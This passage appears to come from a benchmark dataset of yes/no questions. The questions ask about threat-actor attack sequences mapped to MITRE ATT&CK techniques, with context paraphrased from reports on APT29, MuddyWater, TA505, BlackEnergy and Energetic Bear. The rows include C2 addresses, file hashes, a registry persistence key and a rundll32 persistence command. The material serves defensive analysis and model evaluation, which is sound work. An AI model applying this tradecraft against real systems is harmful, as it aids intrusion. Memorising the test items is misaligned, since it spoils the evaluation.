Others: Symantec has been protecting its customers from Longhorn's tools for the past three years and has continued to track the group. Longhorn has infiltrated governments and internationally operating organizations, as well as targets in various sectors. Symantec has found evidence of Longhorn activities against 40 targets in 16 countries. The group uses preconfigured malware with target-specific code words and distinct C&C domains and IP addresses. Longhorn operates with a high degree of operational security and appears to work a standard Monday to Friday working week, with indicators suggesting it is from an English-speaking, North American country.",Yes,Longhorn_ Tools used by cyberespionage group linked to Vault 7
1170,248,248-Command and Control-T1573-Encrypted Channel,"After maintaining persistent access by likely dropping further tooling and using stolen credentials with anonymizing services, is APT29 likely to deploy WellMess or WellMail malware to establish command and control using encrypted channels?","Command and Control: In some cases, APT29 also deploys custom malware known as WellMess or WellMail to conduct further operations on the victim's system. WellMess is malware written in either Golang or .NET and has been in use since at least 2018. It is designed to execute arbitrary shell commands, upload and download files, and supports HTTP, TLS, and DNS communications methods. WellMail is a lightweight tool designed to run commands or scripts with the results being sent to a hardcoded Command and Control (C2) server. It uses hard-coded client and certificate authority TLS certificates to communicate with C2 servers.","Initial Access: The group frequently uses publicly available exploits to conduct widespread scanning and exploitation against vulnerable systems, likely in an effort to obtain authentication credentials to allow further access. In recent attacks targeting COVID-19 vaccine research and development, the group conducted basic vulnerability scanning against specific external IP addresses owned by the organizations. The group then deployed public exploits against the vulnerable services identified. The group has been successful using recently published exploits to gain initial footholds. Examples include CVE-2019-19781 Citrix, CVE-2019-11510 Pulse Secure, CVE-2018-13379 FortiGate, and CVE-2019-9670 Zimbra. The group also uses spear-phishing to obtain authentication credentials to internet-accessible login pages for target organizations.
Persistence: Upon gaining access to a system, the group likely drops further tooling and/or seeks to obtain legitimate credentials to the compromised systems in order to maintain persistent access. The actor is likely to use anonymizing services when using the stolen credentials.
Others: APT29, also known as 'the Dukes' or 'Cozy Bear', is assessed to be part of the Russian intelligence services by the United Kingdom's National Cyber Security Centre (NCSC) and Canada's Communications Security Establishment (CSE), with agreement from the United States' National Security Agency (NSA) and endorsement from the Department of Homeland Security's Cybersecurity and Infrastructure Security Agency (DHS CISA). The group targets governmental, diplomatic, think-tank, healthcare, and energy targets for intelligence gain. Throughout 2020, APT29 has targeted organizations involved in COVID-19 vaccine development in Canada, the United States, and the United Kingdom, with the intention of stealing information and intellectual property. The group uses custom malware known as 'WellMess' and 'WellMail' to target organizations globally, including those involved with COVID-19 vaccine development. These malware have not previously been publicly associated with APT29. The malware SoreFang, dubbed by the NCSC, is a first stage downloader that uses HTTP to exfiltrate victim information and download second stage malware. It is likely that SoreFang targets SangFor devices. Industry reporting indicates that other actors, including 'DarkHotel', have also targeted SangFor devices. APT29 is likely to continue targeting organizations involved in COVID-19 vaccine research and development.",Yes,Advisory-APT29-targets-COVID-19-vaccine-development
1173,248,248-Initial Access-T1078-Valid Accounts,"After APT29 uses publicly available exploits to gain a foothold for initial access, is it likely that the group will drop further tooling or obtain legitimate credentials on compromised systems to maintain persistence?","Initial Access: The group frequently uses publicly available exploits to conduct widespread scanning and exploitation against vulnerable systems, likely in an effort to obtain authentication credentials to allow further access. In recent attacks targeting COVID-19 vaccine research and development, the group conducted basic vulnerability scanning against specific external IP addresses owned by the organizations. The group then deployed public exploits against the vulnerable services identified. The group has been successful using recently published exploits to gain initial footholds. Examples include CVE-2019-19781 Citrix, CVE-2019-11510 Pulse Secure, CVE-2018-13379 FortiGate, and CVE-2019-9670 Zimbra. The group also uses spear-phishing to obtain authentication credentials to internet-accessible login pages for target organizations.","Persistence: Upon gaining access to a system, the group likely drops further tooling and/or seeks to obtain legitimate credentials to the compromised systems in order to maintain persistent access. The actor is likely to use anonymizing services when using the stolen credentials.
Command and Control: In some cases, APT29 also deploys custom malware known as WellMess or WellMail to conduct further operations on the victim's system. WellMess is malware written in either Golang or .NET and has been in use since at least 2018. It is designed to execute arbitrary shell commands, upload and download files, and supports HTTP, TLS, and DNS communications methods. WellMail is a lightweight tool designed to run commands or scripts with the results being sent to a hardcoded Command and Control (C2) server. It uses hard-coded client and certificate authority TLS certificates to communicate with C2 servers.
Others: APT29, also known as 'the Dukes' or 'Cozy Bear', is assessed to be part of the Russian intelligence services by the United Kingdom's National Cyber Security Centre (NCSC) and Canada's Communications Security Establishment (CSE), with agreement from the United States' National Security Agency (NSA) and endorsement from the Department of Homeland Security's Cybersecurity and Infrastructure Security Agency (DHS CISA). The group targets governmental, diplomatic, think-tank, healthcare, and energy targets for intelligence gain. Throughout 2020, APT29 has targeted organizations involved in COVID-19 vaccine development in Canada, the United States, and the United Kingdom, with the intention of stealing information and intellectual property. The group uses custom malware known as 'WellMess' and 'WellMail' to target organizations globally, including those involved with COVID-19 vaccine development. These malware have not previously been publicly associated with APT29. The malware SoreFang, dubbed by the NCSC, is a first stage downloader that uses HTTP to exfiltrate victim information and download second stage malware. It is likely that SoreFang targets SangFor devices. Industry reporting indicates that other actors, including 'DarkHotel', have also targeted SangFor devices. APT29 is likely to continue targeting organizations involved in COVID-19 vaccine research and development.",Yes,Advisory-APT29-targets-COVID-19-vaccine-development
1177,249,249-Defense Evasion-T1027-Obfuscated Files or Information,"After payloads are delivered through malicious documents in Initial Access and macros are enabled leading to file execution in randomly named directories during Execution, is it likely that campaigns use obfuscation processes and tools like publicly available code for bypassing AppLocker as part of their Defense Evasion tactics?","Defense Evasion: The campaigns use similar obfuscation processes, and the internal variables after deobfuscation. A list of isDebugEnv is also present in both campaigns. The PowerShell script employs several layers of obfuscation. The scriptlet file and inf file use publicly available code for bypassing AppLocker.","Initial Access: We discovered a new campaign targeting organizations in Turkey, Pakistan, and Tajikistan that has similarities with an earlier campaign named MuddyWater. The campaign uses malicious delivery documents containing text and file names in the Tajik language, attempting to target individuals working for government organizations and telecommunication companies in Tajikistan. Each document uses social engineering to trick potential victims into enabling macros and activating the payload. Some payloads were embedded inside the document, while others were downloaded from the internet after the lure was clicked. There is also a separate lure with a program key generator written in Java that was bundled with a Java downloader. The actual payload is the same in both cases.
Execution: After enabling the macros and the payload executes, two files are created in the ProgramData directory placed in randomly-named directories. The purpose of the .VBS script is to execute the PowerShell script. The path to the VBS script is added to the task scheduler as a form of persistence. In other campaigns, two files are also dropped: a VBS script and a base64 encoded text file, which results in the PowerShell file after decoding. The latest change drops three files: an .sct scriptlet file, an .inf file, and a base64 encoded data file. The scriptlet file and inf file use publicly available code for bypassing AppLocker. The PowerShell script employs several layers of obfuscation and is divided into three parts: global variables like paths and encryption keys, functions related to encryption, and the backdoor function which collects machine information, takes screenshots, and sends this data to a C&C server while waiting for commands.
Persistence: The path to the VBS script is added to the task scheduler as a form of persistence.
Discovery: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Collection: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Command and Control: The communication with the C&C server is done via XML messages with supported ACTION commands: REGISTER, IMAGE, COMMAND, RESULT, and UPLOAD. The backdoor finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine. This IP address is then fed to another internet service called apinotes[.]com, which returns the location information of the given IP address. The backdoor then collects system information about the infected machine and sends this as part of the REGISTER message. The communication is encrypted using a simple RSA algorithm with very small keys.
Others: The attackers are actively monitoring the incoming connections to the C&C server. In one attempt, an improper request to the C&C server was met with a personalized message: ""Stop!!! I Kill You Researcher."" This indicates that the attackers are monitoring what data is going to and from their C&C server. Another hidden message or a false flag is found in the PowerShell script, with error messages written in simplified Mandarin Chinese displayed if communication with C&C fails and the script is run from a command line. These messages may not reveal anything about the real attackers as malware writers sometimes embed false flags into their programs to confuse researchers.",Yes,MuddyWater_Middle_East_and_Central_Asia
1179,249,249-Discovery-T1010-Application Window Discovery,"After employing obfuscation through scriptlet and inf files for defense evasion, is it likely that the backdoor function will collect machine information and take screenshots during the discovery phase before sending this data to the C&C server for registration?",Discovery: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.,"Initial Access: We discovered a new campaign targeting organizations in Turkey, Pakistan, and Tajikistan that has similarities with an earlier campaign named MuddyWater. The campaign uses malicious delivery documents containing text and file names in the Tajik language, attempting to target individuals working for government organizations and telecommunication companies in Tajikistan. Each document uses social engineering to trick potential victims into enabling macros and activating the payload. Some payloads were embedded inside the document, while others were downloaded from the internet after the lure was clicked. There is also a separate lure with a program key generator written in Java that was bundled with a Java downloader. The actual payload is the same in both cases.
Execution: After enabling the macros and the payload executes, two files are created in the ProgramData directory placed in randomly-named directories. The purpose of the .VBS script is to execute the PowerShell script. The path to the VBS script is added to the task scheduler as a form of persistence. In other campaigns, two files are also dropped: a VBS script and a base64 encoded text file, which results in the PowerShell file after decoding. The latest change drops three files: an .sct scriptlet file, an .inf file, and a base64 encoded data file. The scriptlet file and inf file use publicly available code for bypassing AppLocker. The PowerShell script employs several layers of obfuscation and is divided into three parts: global variables like paths and encryption keys, functions related to encryption, and the backdoor function which collects machine information, takes screenshots, and sends this data to a C&C server while waiting for commands.
Persistence: The path to the VBS script is added to the task scheduler as a form of persistence.
Defense Evasion: The campaigns use similar obfuscation processes, and the internal variables after deobfuscation. A list of isDebugEnv is also present in both campaigns. The PowerShell script employs several layers of obfuscation. The scriptlet file and inf file use publicly available code for bypassing AppLocker.
Collection: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Command and Control: The communication with the C&C server is done via XML messages with supported ACTION commands: REGISTER, IMAGE, COMMAND, RESULT, and UPLOAD. The backdoor finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine. This IP address is then fed to another internet service called apinotes[.]com, which returns the location information of the given IP address. The backdoor then collects system information about the infected machine and sends this as part of the REGISTER message. The communication is encrypted using a simple RSA algorithm with very small keys.
Others: The attackers are actively monitoring the incoming connections to the C&C server. In one attempt, an improper request to the C&C server was met with a personalized message: ""Stop!!! I Kill You Researcher."" This indicates that the attackers are monitoring what data is going to and from their C&C server. Another hidden message or a false flag is found in the PowerShell script, with error messages written in simplified Mandarin Chinese displayed if communication with C&C fails and the script is run from a command line. These messages may not reveal anything about the real attackers as malware writers sometimes embed false flags into their programs to confuse researchers.",Yes,MuddyWater_Middle_East_and_Central_Asia
1180,249,249-Command and Control-T1573-Encrypted Channel,"After employing a backdoor function to collect machine information and take screenshots during the Discovery and Collection tactics, is it likely that the backdoor will communicate with the C&C server via an encrypted channel during the Command and Control phase?","Command and Control: The communication with the C&C server is done via XML messages with supported ACTION commands: REGISTER, IMAGE, COMMAND, RESULT, and UPLOAD. The backdoor finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine. This IP address is then fed to another internet service called apinotes[.]com, which returns the location information of the given IP address. The backdoor then collects system information about the infected machine and sends this as part of the REGISTER message. The communication is encrypted using a simple RSA algorithm with very small keys.","Initial Access: We discovered a new campaign targeting organizations in Turkey, Pakistan, and Tajikistan that has similarities with an earlier campaign named MuddyWater. The campaign uses malicious delivery documents containing text and file names in the Tajik language, attempting to target individuals working for government organizations and telecommunication companies in Tajikistan. Each document uses social engineering to trick potential victims into enabling macros and activating the payload. Some payloads were embedded inside the document, while others were downloaded from the internet after the lure was clicked. There is also a separate lure with a program key generator written in Java that was bundled with a Java downloader. The actual payload is the same in both cases.
Execution: After enabling the macros and the payload executes, two files are created in the ProgramData directory placed in randomly-named directories. The purpose of the .VBS script is to execute the PowerShell script. The path to the VBS script is added to the task scheduler as a form of persistence. In other campaigns, two files are also dropped: a VBS script and a base64 encoded text file, which results in the PowerShell file after decoding. The latest change drops three files: an .sct scriptlet file, an .inf file, and a base64 encoded data file. The scriptlet file and inf file use publicly available code for bypassing AppLocker. The PowerShell script employs several layers of obfuscation and is divided into three parts: global variables like paths and encryption keys, functions related to encryption, and the backdoor function which collects machine information, takes screenshots, and sends this data to a C&C server while waiting for commands.
Persistence: The path to the VBS script is added to the task scheduler as a form of persistence.
Defense Evasion: The campaigns use similar obfuscation processes, and the internal variables after deobfuscation. A list of isDebugEnv is also present in both campaigns. The PowerShell script employs several layers of obfuscation. The scriptlet file and inf file use publicly available code for bypassing AppLocker.
Discovery: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Collection: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Others: The attackers are actively monitoring the incoming connections to the C&C server. In one attempt, an improper request to the C&C server was met with a personalized message: ""Stop!!! I Kill You Researcher."" This indicates that the attackers are monitoring what data is going to and from their C&C server. Another hidden message or a false flag is found in the PowerShell script, with error messages written in simplified Mandarin Chinese displayed if communication with C&C fails and the script is run from a command line. These messages may not reveal anything about the real attackers as malware writers sometimes embed false flags into their programs to confuse researchers.",Yes,MuddyWater_Middle_East_and_Central_Asia
1184,249,249-Execution-T1053-Scheduled Task/Job,"After using social engineering to trick victims into enabling macros and payload execution, is it likely that the attackers will add the path to the VBS script to the task scheduler for persistence before the PowerShell script collects system information and communicates with a C&C server?","Execution: After enabling the macros and the payload executes, two files are created in the ProgramData directory placed in randomly-named directories. The purpose of the .VBS script is to execute the PowerShell script. The path to the VBS script is added to the task scheduler as a form of persistence. In other campaigns, two files are also dropped: a VBS script and a base64 encoded text file, which results in the PowerShell file after decoding. The latest change drops three files: an .sct scriptlet file, an .inf file, and a base64 encoded data file. The scriptlet file and inf file use publicly available code for bypassing AppLocker. The PowerShell script employs several layers of obfuscation and is divided into three parts: global variables like paths and encryption keys, functions related to encryption, and the backdoor function which collects machine information, takes screenshots, and sends this data to a C&C server while waiting for commands.","Initial Access: We discovered a new campaign targeting organizations in Turkey, Pakistan, and Tajikistan that has similarities with an earlier campaign named MuddyWater. The campaign uses malicious delivery documents containing text and file names in the Tajik language, attempting to target individuals working for government organizations and telecommunication companies in Tajikistan. Each document uses social engineering to trick potential victims into enabling macros and activating the payload. Some payloads were embedded inside the document, while others were downloaded from the internet after the lure was clicked. There is also a separate lure with a program key generator written in Java that was bundled with a Java downloader. The actual payload is the same in both cases.
Persistence: The path to the VBS script is added to the task scheduler as a form of persistence.
Defense Evasion: The campaigns use similar obfuscation processes, and the internal variables after deobfuscation. A list of isDebugEnv is also present in both campaigns. The PowerShell script employs several layers of obfuscation. The scriptlet file and inf file use publicly available code for bypassing AppLocker.
Discovery: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Collection: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Command and Control: The communication with the C&C server is done via XML messages with supported ACTION commands: REGISTER, IMAGE, COMMAND, RESULT, and UPLOAD. The backdoor finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine. This IP address is then fed to another internet service called apinotes[.]com, which returns the location information of the given IP address. The backdoor then collects system information about the infected machine and sends this as part of the REGISTER message. The communication is encrypted using a simple RSA algorithm with very small keys.
Others: The attackers are actively monitoring the incoming connections to the C&C server. In one attempt, an improper request to the C&C server was met with a personalized message: ""Stop!!! I Kill You Researcher."" This indicates that the attackers are monitoring what data is going to and from their C&C server. Another hidden message or a false flag is found in the PowerShell script, with error messages written in simplified Mandarin Chinese displayed if communication with C&C fails and the script is run from a command line. These messages may not reveal anything about the real attackers as malware writers sometimes embed false flags into their programs to confuse researchers.",Yes,MuddyWater_Middle_East_and_Central_Asia
1188,25,25-Execution-T1204-User Execution,"After gaining initial access by embedding malicious MS Office documents in phishing emails, is it likely that victims would be instructed to disable security controls before a macro downloads malicious payloads from the threat actor's C2 infrastructure?","Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.","Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Command and Control: The RMS executable attempted to 'call home' with connection attempts observed to a C2 server located in Germany. Additional malicious samples and associated C2 domains/IP addresses were linked to TA505 operations utilizing the 'ServHelper' backdoor.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",Yes,CyberInt_Legit Remote Access Tools Turn Into Threat Actors' Tools_Report
1189,25,25-Persistence-T1547-Boot or Logon Autostart Execution,"After the malicious macro executed from the MS Office documents and successfully downloaded the RMS tool and supporting scripts, is it likely that the threat actors will achieve persistence by adding a 'Microtik' string value to the registry and launching the RMS executable before attempting to kill the 'rundll32.exe' process?","Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.","Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Command and Control: The RMS executable attempted to 'call home' with connection attempts observed to a C2 server located in Germany. Additional malicious samples and associated C2 domains/IP addresses were linked to TA505 operations utilizing the 'ServHelper' backdoor.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",Yes,CyberInt_Legit Remote Access Tools Turn Into Threat Actors' Tools_Report
1190,25,25-Command and Control-T1071-Application Layer Protocol,"After attackers used the RMS tool for reconnaissance and lateral movement within the victim network to evade defenses, is it likely that the RMS executable attempted to communicate with a C2 server located in Germany using application layer protocols?",Command and Control: The RMS executable attempted to 'call home' with connection attempts observed to a C2 server located in Germany. Additional malicious samples and associated C2 domains/IP addresses were linked to TA505 operations utilizing the 'ServHelper' backdoor.,"Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",Yes,CyberInt_Legit Remote Access Tools Turn Into Threat Actors' Tools_Report
1191,25,25-Command and Control-T1219-Remote Access Software,"After obtaining persistence by adding a 'Microtik' string value to the Windows registry Run key to launch the RMS executable during user logon and using it to evade detection during reconnaissance and lateral movement, is it likely that the RMS executable will attempt connection to a C2 server located in Germany and that TA505 will utilize the ServHelper backdoor during the Command and Control phase?",Command and Control: The RMS executable attempted to 'call home' with connection attempts observed to a C2 server located in Germany. Additional malicious samples and associated C2 domains/IP addresses were linked to TA505 operations utilizing the 'ServHelper' backdoor.,"Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",Yes,CyberInt_Legit Remote Access Tools Turn Into Threat Actors' Tools_Report
1193,250,250-Persistence-T1547-Boot or Logon Autostart Execution,"After executing the BlackEnergy dropper through a malicious Word document's VBA macro, is it likely that the malware will ensure its persistence by creating a LNK file in the system startup folder and using it to execute a command before connecting to the hardcoded C&C server at 5.149.254[.]114?","Persistence: The BlackEnergy dropper ensured execution on every system startup by creating a LNK file in the system startup folder, which executed the command ""rundll32.exe \""%LOCALAPPDATA%\FONTCACHE.DAT\"",#1"" on every system boot.","Initial Access: Late last year, a wave of cyber-attacks hit several critical sectors in Ukraine. The BlackEnergy APT group, known for targeting Ukraine, utilized Excel documents with macros to drop the BlackEnergy Trojan if the user enabled the script. A new attack vector was identified involving a Microsoft Word document named ""$RR143TB.doc"" (md5: e15b36c2e394d599a8ab352159089dd2), which was uploaded from Ukraine on January 20, 2016. The document, created on 2015-07-27, enticed users to enable macros to view content related to the ""Right Sector"" party in Ukraine. The payload, ""vba_macro.exe"" (md5: ac2d7f21c826ce0c449481f79138aebd), executed upon enabling macros, dropped a DLL file as ""%LOCALAPPDATA%\FONTCACHE.DAT"" and ensured persistence through a LNK file in the startup folder. The final payload connected to a C&C server at 5.149.254[.]114, which is currently offline.
Execution: Upon enabling macros in the malicious Word document, the macro built a string in memory containing a file named ""vba_macro.exe"". This file was then executed using the Shell command, leading to the execution of the BlackEnergy dropper.
Command and Control: The final payload of the BlackEnergy Trojan, identified as FONTCACHE.DAT (md5: 3fa9130c9ec44e36e52142f3688313ff), was designed to connect to a hardcoded C&C server at 5.149.254[.]114 on port 80. The server, previously mentioned by ESET, is currently offline or limiting connections by IP address. If online, the malware would issue an HTTP POST request, sending basic victim info and requesting commands. The request is BASE64 encoded and contains fields such as b_id and b_gen, which include a build id and a unique machine identifier.
Impact: The BlackEnergy APT group's attacks in Ukraine indicate a focus on destructive actions, compromising industrial control installations, and espionage activities. The earliest signs of destructive payloads with BlackEnergy date back to June 2014, with recent attacks showing more sophisticated high-level wiping capabilities targeting file extensions.
Others: Kaspersky Lab's products detect the various trojans mentioned as Backdoor.Win32.Fonten.* and HEUR:Trojan-Downloader.Script.Generic. More information about BlackEnergy APT and extended IOCs are available to customers of Kaspersky Intelligence Services. For countering BlackEnergy and similar threats, Kaspersky Business Blog provides additional insights.",Yes,blackenergy-apt-attacks-in-ukraine-employ-spearphishing-with-word-documents
1194,250,250-Command and Control-T1095-Non-Application Layer Protocol,"After ensuring persistence by creating a LNK file in the system startup folder to execute ""rundll32.exe \""%LOCALAPPDATA%\FONTCACHE.DAT\"",#1"" on every system boot, is it likely that the BlackEnergy Trojan will connect to its hardcoded C&C server at 5.149.254[.]114 on port 80 to issue an HTTP POST request with BASE64-encoded victim information?","Command and Control: The final payload of the BlackEnergy Trojan, identified as FONTCACHE.DAT (md5: 3fa9130c9ec44e36e52142f3688313ff), was designed to connect to a hardcoded C&C server at 5.149.254[.]114 on port 80. The server, previously mentioned by ESET, is currently offline or limiting connections by IP address. If online, the malware would issue an HTTP POST request, sending basic victim info and requesting commands. The request is BASE64 encoded and contains fields such as b_id and b_gen, which include a build id and a unique machine identifier.","Initial Access: Late last year, a wave of cyber-attacks hit several critical sectors in Ukraine. The BlackEnergy APT group, known for targeting Ukraine, utilized Excel documents with macros to drop the BlackEnergy Trojan if the user enabled the script. A new attack vector was identified involving a Microsoft Word document named ""$RR143TB.doc"" (md5: e15b36c2e394d599a8ab352159089dd2), which was uploaded from Ukraine on January 20, 2016. The document, created on 2015-07-27, enticed users to enable macros to view content related to the ""Right Sector"" party in Ukraine. The payload, ""vba_macro.exe"" (md5: ac2d7f21c826ce0c449481f79138aebd), executed upon enabling macros, dropped a DLL file as ""%LOCALAPPDATA%\FONTCACHE.DAT"" and ensured persistence through a LNK file in the startup folder. The final payload connected to a C&C server at 5.149.254[.]114, which is currently offline.
Execution: Upon enabling macros in the malicious Word document, the macro built a string in memory containing a file named ""vba_macro.exe"". This file was then executed using the Shell command, leading to the execution of the BlackEnergy dropper.
Persistence: The BlackEnergy dropper ensured execution on every system startup by creating a LNK file in the system startup folder, which executed the command ""rundll32.exe \""%LOCALAPPDATA%\FONTCACHE.DAT\"",#1"" on every system boot.
Impact: The BlackEnergy APT group's attacks in Ukraine indicate a focus on destructive actions, compromising industrial control installations, and espionage activities. The earliest signs of destructive payloads with BlackEnergy date back to June 2014, with recent attacks showing more sophisticated high-level wiping capabilities targeting file extensions.
Others: Kaspersky Lab's products detect the various trojans mentioned as Backdoor.Win32.Fonten.* and HEUR:Trojan-Downloader.Script.Generic. More information about BlackEnergy APT and extended IOCs are available to customers of Kaspersky Intelligence Services. For countering BlackEnergy and similar threats, Kaspersky Business Blog provides additional insights.",Yes,blackenergy-apt-attacks-in-ukraine-employ-spearphishing-with-word-documents
1199,251,251-Reconnaissance-T1589-Gather Victim Identity Information,Is it likely that Energetic Bear will compromise a Turkish energy company's website through a supply chain attack to conduct a watering hole attack targeting Turkish critical infrastructure after targeting software suppliers for programmable logic controller (PLC) components during the reconnaissance phase?,"Reconnaissance: The CTI report details a campaign by the threat group 'Energetic Bear' involving strategic web compromises for reconnaissance purposes. The group, known for cyber espionage, targeted specific entities such as software suppliers for programmable logic controller (PLC) components used in critical infrastructure. They backdoored these with Havex malware. An example given is the compromise of the Turkish energy company Turcas Petrol's website, turcas.com.tr, which was injected with SMB credential-harvesting malware.","Initial Access: The CTI report describes an initial access technique used by 'Energetic Bear' where a Turkish energy company's website was compromised through a supply chain attack and used in a watering hole attack targeting individuals associated with Turkish critical infrastructure. The site was injected with SMB credential-harvesting malware to facilitate this access.
Credential Access: The CTI report indicates that 'Energetic Bear' used SMB credential-harvesting malware as part of their credential access strategy. This was observed in the compromise of the Turkish energy company's website, where an image URL was modified to redirect to a file protocol, allowing the group to harvest Microsoft SMB credentials.
Others: The CTI report by RiskIQ provides insights into 'Energetic Bear's' broader targeting strategy beyond specific entities. General-purpose websites like plantengineering.com, serving as hubs for critical infrastructure sector information, were also compromised. The attackers had broad access to the server, indicating a definite pattern of targeting news and information websites for the industrial sector. RiskIQ's analysis suggests that the campaign started between the beginning of February and the end of March. The report emphasizes the increasing prevalence of supply-chain attacks and the need for site owners to inventory third-party code on their web assets to prevent becoming pawns in such operations.",Yes,New Insights into Energetic Bear's Attacks on Turkish Critical Infrastructure
